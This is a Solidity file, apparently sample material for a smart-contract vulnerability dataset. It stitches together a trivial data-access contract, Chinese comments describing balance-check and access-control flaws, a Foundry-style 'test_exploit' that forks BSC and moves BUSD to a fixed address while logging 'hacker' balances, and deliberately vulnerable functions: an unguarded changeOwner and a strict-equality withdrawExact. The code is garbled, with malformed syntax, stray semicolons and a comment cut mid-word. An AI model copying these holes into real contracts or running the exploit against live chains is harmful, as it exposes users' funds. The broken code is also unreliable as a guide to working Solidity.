
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function grantAccessToData(address requester, string memory dataId) public {
        emit AccessGranted(requester, dataId);
    }
}
pragma solidity ^0.8.10;

/*;
 * SPDX-License-Identifier: UNLICENSED;
 * 严格的余额检查漏洞：严格的余额检查漏洞发生在合约对账户余额的判断逻辑存在错误，导致交易判断失败。在数据交易中，余额检查错误可能导致支付失败或交易无法正常进行，影响资金流转或数据的正常提交与获取。;
 */;

;
;
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value)};
contract ContractTest is Test {
    function setUp() external {
        vm.createSelectFork("bsc", 26982067)};
    function test_exploit() external {
        Exploit exploit = new Exploit();
        exploit.run()};
contract Exploit {
    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 BSC_USD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20[] _erc20 = [BUSD; BSC_USD];
    function run() external {
        console.log("hacker BUSD bal before attack is       ", BUSD.balanceOf(tx.origin));
        _erc20[0].approve(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00, 0xffffffffffffffffffffffffffffffffffffffffffff);
        _erc20[0].transfer(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00, 0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);
        BUSD.transfer(address(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00), 0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);
        console.log("hacker BUSD bal after attack is        ", BUSD.balanceOf(tx.origin))};
/*;
 * SPDX-License-Identifier: UNLICENSED;
 * 权限控制漏洞：权限控制漏洞发生在合约未对敏感操作进行有效的访问控制，允许未经授权的用户执行重
function changeOwner(address newOwner) public {
    owner = newOwner}
function withdrawExact() public {
    require(address(this).balance == 1 ether);
    payable(msg.sender).transfer(1 ether)}